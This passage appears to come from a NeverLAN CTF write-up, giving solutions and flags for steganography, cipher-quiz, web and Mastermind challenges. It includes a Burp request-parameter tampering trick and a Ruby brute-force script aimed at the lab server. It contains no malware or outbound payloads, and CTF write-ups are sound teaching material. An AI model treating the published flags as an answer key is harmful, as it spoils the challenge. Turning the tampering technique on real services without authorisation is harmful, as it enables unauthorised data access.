<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">1369          0x559           HTML document header</div><div class="line">4003          0xFA3           HTML document footer</div><div class="line">9689          0x25D9          Unix path: /WqckbqxDJsHoQRUjuIXZONp/Kk81v7p/KjzN4BFG73qguf/0Pu9</div><div class="line">11085         0x2B4D          Unix path: /4RD4Z6ZCUZZplNxIrjBy/I/QgV9N/DfxvL4aeO+t0</div><div class="line">13229         0x33AD          Unix path: /ENn/Y/huxtvl8wx5Yrjljz/XFcVZQtPdqFRpH3DhFzntj8eK7L4h3</div><div class="line">13284         0x33E4          Unix path: /nakVUgImCE9BjOK2f2dPAx8c/F/w/p+zfD9pW4kA4+SP5mz7dK8OeIjhsJKtN7Js/Sc0pxnmnsl</div><div class="line">14560         0x38E0          Unix path: /wCEI0L/AJ8I/wDvqtxbcOoY/KTz6Uv2</div><div class="line">15287         0x3BB7          Unix path: /qK6f4i/C/VfHGu/wBs+MdbXXmhwEuZIRFIUAGAQuOn1P0rxLRVlc+hdp6rRI8RvvDfhTxRpk8h</div><div class="line">22696         0x58A8          Unix path: /8E/Ke8hMUKjeWAOBkde/9c/jVZIhnPfvmr2or8qZwpPJHFVQm7ngjsDWt</div><div class="line">23242         0x5ACA          Unix path: /jivyX2F9h6LjJ/P/J/GvqMszD+0Kcm1ZrcqbhUh7WGielgaMcY</div><div class="line">25527         0x63B7          Unix path: /VX4Z/sceA/B/hq2iksI7rUFjAedu/Gf5ivMlZaHq+1jSXNI/P8A+FHxw1DwhrDWGlBbnT3bZLay</div><div class="line">26919         0x6927          Unix path: /g9Ya7q2iG9/4SKO4Xz1zss1b/AFYcehBbrXxjjLmaPufiimmec/DD4VaN4j1K8uIbWym1</div><div class="line">29935         0x74EF          Unix path: /AI/pTd3IVudkZwoPsWP/AI7X2XdzLDG7M20AE5r8q/2lvHLfED4yeIL/</div><div class="line">33346         0x8242          Unix path: /8d2V8h6gAHRADuC54969P/aJ8X/8ACc/H</div><div class="line">35802         0x8BDA          Unix path: /KvZNS/bO8a61EBdzJLFghkZuAOR1/Ovn74k/FC58Q</div><div class="line">36928         0x9040          Unix path: /klCp/1gIwfY1z2sSrIxWX5to/vYrQ4iLU/FsiXLyLB5MucoAPlj/xrKufEV1e4S4K/NyGB</div><div class="line">42880         0xA780          Unix path: /a/E/hDRQwxbWk1y/PQu4Uf+i/1r4a1Ihrjysj93x07100aM</div><div class="line">43257         0xA8F9          Unix path: /Z8yuKjGpSany/ebZ8P6bqWDG/2Vm/ij5H5Gsq/8K3FmC0bxzpuyD0Ki</div><div class="line">49189         0xC025          Unix path: /rtr4UWLzdoB3Z/Kvfv2z/GR8UfGaewhfdaaLAtoo3Y/eHDuf1A/C</div><div class="line">50244         0xC444          Unix path: /ljkcgHrV/RNXOm6pFLjMT/LKnHzr3WgpMr5AA2/xVteG5f3k0bN6HH+fwqprmnHTbwmI7rOb95B</div><div class="line">53176         0xCFB8          Unix path: /8E7tBW30/xJrEsflyTMlvE5/iGSWA/Ja+HzKq6OAqS6yP0PMKqipQh9iKXzPt7Tvml5rY</div><div class="line">55034         0xD6FA          Unix path: /wBivxnBfOmn6hp91bfwySPsY/UGqX/DGPxA/wCfjTP+/wAK+8fIP90n8KPI</div><div class="line">60216         0xEB38          Unix path: /TRd66LiUARWaeeWI6sDhV/U/lT/F1+19qUuO</div><div class="line">65339         0xFF3B          Unix path: /AMBrzL/hb3ib/oI3X5mvAdFXPSWHbSZ//9P4g8A+Ab3VNM1HxQztJpem3kFoSSMvNKrlVwOw</div><div class="line">67005         0x105BD         StuffIt Deluxe Segment (data): fpW74o1EL5VrGoBI3PhRkc</div><div class="line">[...]</div></pre></td></tr></table></figure></p>
<p>So let's extract the base64 string, join it, decode it and save the ouput in a file (with a ruby script of course).</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">"base64"</span></div><div class="line"></div><div class="line">line_no = <span class="number">1</span></div><div class="line">selfie_b64 = <span class="string">""</span></div><div class="line"></div><div class="line">File.open(<span class="string">"email.txt"</span>, <span class="string">'r'</span>) <span class="keyword">do</span> <span class="params">|file|</span></div><div class="line">    file.each <span class="keyword">do</span> <span class="params">|line|</span></div><div class="line">        <span class="keyword">if</span> line_no &gt;= <span class="number">92</span> &amp;&amp; line_no &lt;= <span class="number">12617</span></div><div class="line">            selfie_b64 += line.chomp</div><div class="line">        <span class="keyword">end</span></div><div class="line">        line_no += <span class="number">1</span></div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">selfie_plain = Base64.decode64(selfie_b64)</div><div class="line"></div><div class="line">File.open(<span class="string">"selfie.jpg"</span>, <span class="string">'w'</span>) <span class="keyword">do</span> <span class="params">|file|</span></div><div class="line">    file.write(selfie_plain)</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>I obtained this picture:
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file selfie.jpg</div><div class="line">selfie.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=2, orientation=upper-left], baseline, precision 8, 820x618, frames 3</div></pre></td></tr></table></figure></p>
<p><img src="http://i.imgur.com/tcjBM2a.jpg" alt=""></p>
<p>This image seems to hide something else (trailing data):</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ binwalk selfie.jpg</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">128969        0x1F7C9         Zip archive data, at least v2.0 to extract, name: Death_Star_Owner&apos;s_Technical_Manual_blueprints.jpg</div><div class="line">712883        0xAE0B3         Zip archive data, at least v1.0 to extract, name: __MACOSX/</div><div class="line">712938        0xAE0EA         Zip archive data, at least v2.0 to extract, name: __MACOSX/._Death_Star_Owner&apos;s_Technical_Manual_blueprints.jpg</div><div class="line">713908        0xAE4B4         End of Zip archive</div></pre></td></tr></table></figure></p>
<p>Then I extracted it with <code>foremost</code> and unzip the archive:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ unzip 00000251.zip</div><div class="line">Archive:  00000251.zip</div><div class="line">  inflating: Death_Star_Owner&apos;s_Technical_Manual_blueprints.jpg  </div><div class="line">   creating: __MACOSX/</div><div class="line">  inflating: __MACOSX/._Death_Star_Owner&apos;s_Technical_Manual_blueprints.jpg</div></pre></td></tr></table></figure></p>
<p>Finally, I get this Death Star Elevation Plan:</p>
<p><img src="http://i.imgur.com/YZ84sSG.jpg" alt=""></p>
<p>Flag is <code>rebellions_are_built_on_hope</code>.</p>
<p><strong>Note</strong>: This is steganography, not forensics.</p>
<h2 id="100-thehistoryofcryptography-cryptography">100 - TheHistoryOfCryptography - Cryptography</h2>
<p><code>The_History_of_Cryptography.zip</code> contains two files: <code>0.txt</code> and <code>1.zip</code> :</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cat 0.txt</div><div class="line">This Shifty Cipher is one of the simplest, and most well know ciphers.</div></pre></td></tr></table></figure></p>
<p>Answer: <em>caesar</em></p>
<p>The zip is password protected and the password is the answer of <code>0.txt</code>.</p>
<p><code>1.zip</code> contains 2 files: <code>1.txt</code> and <code>2.zip</code>, and so on.</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat 1.txt</div><div class="line">This Cipher is is named after the person who made it famous, not but the man who first created it.</div><div class="line"></div><div class="line">Password:&quot;The name of cipher in the riddle&quot; with out the quotes.</div></pre></td></tr></table></figure></p>
<p>Answer: <em>vigenere</em></p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat 2.txt</div><div class="line">This transposition cipher was used by the warriors in the famous movie &quot;the 300&quot;</div><div class="line"></div><div class="line">PassWord:&quot;The name of cipher in the riddle&quot; with out the quotes.</div></pre></td></tr></table></figure></p>
<p>Answer: <em>scytale</em></p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat 3.txt</div><div class="line">The first recorded use of this cipher was used to hide a book of magic.</div><div class="line"></div><div class="line">Password:&quot;The name of cipher in the riddle&quot; with out the quotes.</div></pre></td></tr></table></figure></p>
<p>Answer: <em>steganography</em> (<a href="https://en.wikipedia.org/wiki/Steganography" target="_blank" rel="external">details</a>)</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat 4.txt</div><div class="line">This world famous cipher was invented by Arthur Scherbius</div><div class="line"></div><div class="line">Password:&quot;The name of cipher in the riddle&quot; with out the quotes.</div></pre></td></tr></table></figure></p>
<p>Answer: <em>enigma machine</em> (<a href="https://en.wikipedia.org/wiki/Arthur_Scherbius" target="_blank" rel="external">details</a>)</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ cat 5.txt</div><div class="line">Which one is you&apos;re favorite? I love them all because...</div><div class="line">flag&#123;THEHISTORYOFCRYPTOGRAPHYISAW3S0M3&#125;</div></pre></td></tr></table></figure></p>
<p>Flag is <code>THEHISTORYOFCRYPTOGRAPHYISAW3S0M3</code>.</p>
<p><strong>Note</strong>: this challenge was a quizz, not a cryptography challenge. It should have been in Trivia, Misc, Quizz or Other.</p>
<h2 id="100-a-slight-cut-web">100 - A Slight Cut - Web</h2>
<blockquote>
<p><a href="http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/" target="_blank" rel="external">http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/</a></p>
</blockquote>
<p>Source:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;title&gt;A slight cut&lt;/title&gt;</div><div class="line">        &lt;script src=&quot;js/jquery.js&quot;&gt;&lt;/script&gt;</div><div class="line">        &lt;script&gt;</div><div class="line">[...]</div><div class="line">        &lt;/script&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            &lt;h1&gt;type in some text to have the server repeat it back&lt;/h1&gt;</div><div class="line">            &lt;form onsubmit=&quot;getEcho(); return false;&quot;&gt;</div><div class="line">                &lt;input id=&quot;text&quot; name=&quot;text&quot; type=&quot;text&quot; placeholder=&quot;type some text here&quot;/&gt;</div><div class="line">                &lt;input id=&quot;length&quot; type=&quot;hidden&quot; name=&quot;length&quot; value=&quot;0&quot;/&gt;</div><div class="line">                &lt;input type=&quot;submit&quot;/&gt;</div><div class="line">            &lt;/form&gt;</div><div class="line">            &lt;p id=&quot;echo&quot;&gt;output will appear here&lt;/p&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>There is two parameters in te request url: <code>length</code> and <code>text</code>. <code>text</code> comes from the input field, and <code>length</code> is calculated with javascript.</p>
<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getEcho</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> text = $(<span class="string">'#text'</span>).val();</div><div class="line">    <span class="keyword">var</span> length = $(<span class="string">'#length'</span>).val();</div><div class="line">    $.ajax(<span class="string">'echo.php?length='</span>+length+<span class="string">'&amp;text='</span>+text).done(<span class="function"><span class="keyword">function</span>(<span class="params">echoed</span>)</span>&#123;</div><div class="line">        $(<span class="string">'#echo'</span>).text(echoed);</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    $(<span class="string">'#text'</span>).on(<span class="string">'input'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        $(<span class="string">'#length'</span>).val($(<span class="string">'#text'</span>).val().length);</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>If I submit <code>A</code>, the calculated length is <code>1</code>.</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /echo.php?length=1&amp;text=A HTTP/1.1</div><div class="line">Host: neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123</div><div class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0</div><div class="line">Accept: */*</div><div class="line">Accept-Language: en-US,en;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">Connection: close</div></pre></td></tr></table></figure></p>
<p>But what will happen if I change the value from 1 to 1000 with Burp:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /echo.php?length=1000&amp;text=A HTTP/1.1</div></pre></td></tr></table></figure></p>
<p>The server displays more than intended:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Auo$@uyc kds2^4a ady 5 tyusft tuyuy_#65afajty ajb tjuflt ty%&amp;(juuyttyjtji KEY: flag&#123;bleeding_in_javascript&#125; SDF4 asd6f ayj1dsgff@ af ttmtum56tu$%ga wrg3@#%aa9-mtyumty dfgsaumg68g$%ershe as 9tuyt t9uty38dsdfg-5f htyd45s#$</div></pre></td></tr></table></figure></p>
<p>Flag is: <code>bleeding_in_javascript</code>.</p>
<h2 id="300-webcipher-web">300 - WebCipher - Web</h2>
<blockquote>
<p>#anti-human</p>
<p><a href="http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/" target="_blank" rel="external">http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/</a></p>
<p>word list:</p>
<p><a href="https://s3-us-west-2.amazonaws.com/neverlanctf/files/words.txt" target="_blank" rel="external">https://s3-us-west-2.amazonaws.com/neverlanctf/files/words.txt</a></p>
</blockquote>
<p>Source:</p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>anti-human cipher<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"cipher_box"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"cipher"</span>&gt;</span>shhsjwfl<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"form_box"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form"</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">action</span>=<span class="string">"?"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"deciphered"</span> <span class="attr">id</span>=<span class="string">"deciphered"</span>/&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>/&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>First thing is to understand what to do. Here is what the server do:</p>
<ul>
<li>A word is picked up randomly from <code>words.txt</code></li>
<li>This word is randomly rotated (Caesar cipher with a shift between 1 and 25)</li>
<li>Then the shifted word is displayed for a few seconds</li>
<li>A new word is picked up and so on...</li>
</ul>
<p>So we need a script that:</p>
<ul>
<li>Get the shifted word</li>
<li>Cross the dictionary and test words one by one (only same length as teh shifted word)</li>
<li>For each tested word try all possible shifting</li>
<li>Break when that match</li>
<li>Send the answer (decipered/unshifted word)</li>
<li>Get the flag</li>
</ul>
<p>So that's what I did with a ruby script and <code>curb</code>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ ruby webcipher.rb</div><div class="line">• Connexion works</div><div class="line">• Cracking ciphered word</div><div class="line">• Deciphered: cassidony</div><div class="line">• Sending answer</div><div class="line">• Flag: c34s3r_c1ph3r_70_7h3_m4x</div></pre></td></tr></table></figure></p>
<p>My ruby script:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line"><span class="comment"># from https://gist.github.com/matugm/db363c7131e6af27716c</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar_cipher</span><span class="params">(string, shift = <span class="number">1</span>)</span></span></div><div class="line">    alphabet   = Array(<span class="string">'a'</span>..<span class="string">'z'</span>)</div><div class="line">    encrypter  = Hash[alphabet.zip(alphabet.rotate(shift))]</div><div class="line">    string.chars.map &#123; <span class="params">|c|</span> encrypter.fetch(c, <span class="string">" "</span>) &#125;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">hostname = <span class="string">'http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/index.php'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'PHPSESSID=30ff4361f8af2985595bff7c9614b1f1'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line"></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/anti\-human cipher/</span>)</div><div class="line">  puts <span class="string">'• Connexion works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># get the cipher word</span></div><div class="line">ciphered_word = c.body_str.match(<span class="regexp">/&lt;h1 id="cipher"&gt;([a-zA-Z]*)&lt;\/h1&gt;/</span>).captures[<span class="number">0</span>]</div><div class="line">ciphered_word.downcase! <span class="comment"># put lowercase</span></div><div class="line">ciphered_word_length = ciphered_word.length</div><div class="line"></div><div class="line">puts <span class="string">'• Cracking ciphered word'</span></div><div class="line">do_break = <span class="literal">false</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">File.open(<span class="string">"words.txt"</span>, <span class="string">'r'</span>) <span class="keyword">do</span> <span class="params">|file|</span></div><div class="line">    file.each <span class="keyword">do</span> <span class="params">|word|</span></div><div class="line">        word.chomp! <span class="comment"># remove spaces</span></div><div class="line">        <span class="keyword">if</span> word.length.eql?(ciphered_word_length) <span class="comment"># only try word with same length</span></div><div class="line">            answer = word <span class="comment"># save the word because it can be mixed case</span></div><div class="line">            word.downcase! <span class="comment"># put lowercase</span></div><div class="line">            <span class="comment"># puts "word: #&#123;word&#125;"</span></div><div class="line">            (<span class="number">1</span>..<span class="number">25</span>).each <span class="keyword">do</span> <span class="params">|i|</span></div><div class="line">                <span class="comment"># puts caesar_cipher(word, i).join</span></div><div class="line">                <span class="keyword">if</span> caesar_cipher(word, i).join == ciphered_word</div><div class="line">                    puts <span class="string">"• Deciphered: <span class="subst">#&#123;word&#125;</span>"</span></div><div class="line">                    do_break = <span class="literal">true</span></div><div class="line">                    <span class="keyword">break</span></div><div class="line">                <span class="keyword">end</span></div><div class="line">            <span class="keyword">end</span></div><div class="line">        <span class="keyword">end</span></div><div class="line">        <span class="keyword">break</span> <span class="keyword">if</span> do_break</div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">puts <span class="string">"• Sending answer"</span></div><div class="line">c.url = hostname.concat(<span class="string">"?deciphered=<span class="subst">#&#123;answer&#125;</span>"</span>)</div><div class="line">c.perform</div><div class="line"></div><div class="line">puts <span class="string">"• Flag: "</span>.concat(c.body_str.match(<span class="regexp">/&lt;p&gt;flag&#123;(.*)&#125;&lt;\/p&gt;/</span>).captures[<span class="number">0</span>])</div></pre></td></tr></table></figure></p>
<p><strong>Note</strong>: This is not web, this is scripting.</p>
<h2 id="50-master-mind-1-other">50 - Master Mind 1 - Other</h2>
<blockquote>
<p>Can you break my three digit lock?</p>
<p><a href="https://ctf.neverlanctf.com/files/fd671a9b0e49da2d34c8fcc055663d9c/MasterMind1.txt" target="_blank" rel="external">MasterMind1.txt</a></p>
</blockquote>
<p>Source:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">+-----------------------+</div><div class="line">|       |       |       |</div><div class="line">|   7   |   3   |   6   | One number is correct but wrongly placed</div><div class="line">|       |       |       |</div><div class="line">|_______|_______|_______|</div><div class="line">|       |       |       |</div><div class="line">|   0   |   6   |   5   | One number is correct and correctly placed</div><div class="line">|       |       |       |</div><div class="line">|_______|_______|_______|</div><div class="line">|       |       |       |</div><div class="line">|   3   |   7   |   2   | Two numbers are correct but wrongly placed</div><div class="line">|       |       |       |</div><div class="line">|_______|_______|_______|</div><div class="line">|       |       |       |</div><div class="line">|   6   |   4   |   7   | No numbers are correct</div><div class="line">|       |       |       |</div><div class="line">|_______|_______|_______|</div><div class="line">|       |       |       |</div><div class="line">|   5   |   2   |   4   | One number is correct and correctly placed</div><div class="line">|       |       |       |</div><div class="line">|       |       |       |</div><div class="line">+-----------------------+</div></pre></td></tr></table></figure></p>
<p>Rules: <a href="https://en.wikipedia.org/wiki/Mastermind_(board_game)" target="_blank" rel="external">Mastermind</a></p>
<p>Code-breaking:</p>
<ul>
<li>Line 4: 647, No numbers are correct =&gt; [0,1,2,3,5,8,9] are possible</li>
<li>Line 1: 736, One number is correct but wrongly placed =&gt; 7 and 6 are wrong, so 3 is in the code and is right or left</li>
<li>Line 2: 065, One number is correct and correctly placed =&gt; 6 is wrong, so 0 or 5 is in the code and corrctly placed</li>
<li>Line 3: 372, Two numbers are correct but wrongly placed =&gt; 7 is wrong, 3 and 2 are good so [3,2,[0|5]] are possible</li>
<li>Line 5: 524, One number is correct and correctly placed =&gt; Only one number is correct, 2 is good so 5 is wrong and [3,2,0] are possible</li>
<li>(We have the three numbers so now let's order them)</li>
<li>Line 5: 524, One number is correct and correctly placed =&gt; 2 is middle</li>
<li>Line 2: 065, One number is correct and correctly placed =&gt; 0 is left</li>
<li>So 3 is right</li>
</ul>
<p>Flag is <code>023</code>.</p>
<h2 id="100-master-mind-2-other">100 - Master Mind 2 - Other</h2>
<blockquote>
<p>I've upgraded my lock! Can you solve it?</p>
<p><a href="https://ctf.neverlanctf.com/files/7ce349ea5750338cb65d4e92cbd1a56e/MasterMind2.txt" target="_blank" rel="external">MasterMind2.txt</a></p>
</blockquote>
<p>Source:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">+-------------------------------+</div><div class="line">|       |       |       |       |</div><div class="line">|   9   |   5   |   3   |   2   | One number is correct but wrongly placed</div><div class="line">|       |       |       |       |</div><div class="line">|_______|_______|_______|_______|</div><div class="line">|       |       |       |       |</div><div class="line">|   1   |   6   |   7   |   3   | Two numbers are correct and correctly placed</div><div class="line">|       |       |       |       |</div><div class="line">|_______|_______|_______|_______|</div><div class="line">|       |       |       |       |</div><div class="line">|   0   |   6   |   5   |   9   | Two numbers are correct but wrongly placed</div><div class="line">|       |       |       |       |</div><div class="line">|_______|_______|_______|_______|</div><div class="line">|       |       |       |       |</div><div class="line">|   2   |   4   |   3   |   8   | No numbers are correct</div><div class="line">|       |       |       |       |</div><div 